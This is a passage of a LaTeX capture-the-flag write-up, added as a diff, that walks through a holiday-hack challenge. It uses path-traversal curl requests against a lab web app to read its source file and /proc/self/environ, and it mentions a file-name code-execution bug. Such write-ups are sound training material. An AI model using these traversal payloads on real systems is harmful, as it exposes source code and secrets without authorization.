@@ -1,0 +1,36 @@
+\chapter{Objective 8}
+Grinch had already eyeballed that machine and knew about boundaries. So this time, he pretended to be Santa. He also had some pictures lying around.
+
+\subsection{Solving the problem}
+Grinch initially tried to figure out what's going on with the site. You know, normal stuff.
+He uploaded some pics and noticed that he could visit them in the APP/image?id= path. He remembered that hint from the elf about the source code.
+He jumped in his favourite terminal.
+\begin{minted}{bash}
+$ curl https://tag-generator.kringlecastle.com/RandomPathNotExisting # Force error
+<h1>Something went wrong!</h1>
+
+<p>Error in /app/lib/app.rb: Route not found</p>
+$ # We know where the source is located.
+$ curl https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb
+# encoding: ASCII-8BIT
+
+TMP_FOLDER = '/tmp'
+FINAL_FOLDER = '/tmp'
+
+<snip>
+
+$ # We have the source code.
+\end{minted}
+
+Grinch was laughing that he had the source code. Per the source, one could upload zip, png, and jpg images.
+Also, there was a code execution vulnerability in the file name. Grinch was experienced enough to test first whether he could
+fetch the env variable in some other way. Maybe, the env variable was exposed in the app.
+
+\begin{minted}{bash}
+$ curl https://tag-generator.kringlecastle.com/image?id=../../../proc/self/environ --output -
+<snip>
+GREETZ=JackFrostWasHere
+<snip>
+\end{minted}
+
+Sure enough, the variable was accessible.
